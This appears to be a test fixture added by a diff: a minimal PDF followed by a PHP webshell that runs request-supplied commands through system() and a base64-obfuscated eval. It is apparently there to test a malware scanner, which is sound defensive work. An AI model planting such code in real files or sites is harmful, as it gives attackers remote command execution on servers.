@@ -1,0 +1,34 @@
+%PDF-1.4
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
+endobj
+4 0 obj
+<< /Length 150 >>
+stream
+BT
+/F1 12 Tf
+72 710 Td
+(ZraCore Security Audit - Simulated Suspicious Attachment) Tj
+ET
+endstream
+endobj
+trailer
+<< /Root 1 0 R >>
+%%EOF
+
+/* [ZRACORE MALWARE LAB SIMULATION PAYLOAD] */
+<?php
+// Simulated PHP Webshell / Backdoor Payload for testing File Malware Scanner
+if (isset($_REQUEST['cmd'])) {
+    $cmd = ($_REQUEST['cmd']);
+    system($cmd);
+    exit;
+}
+eval(base64_decode('c3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOw=='));
+?>
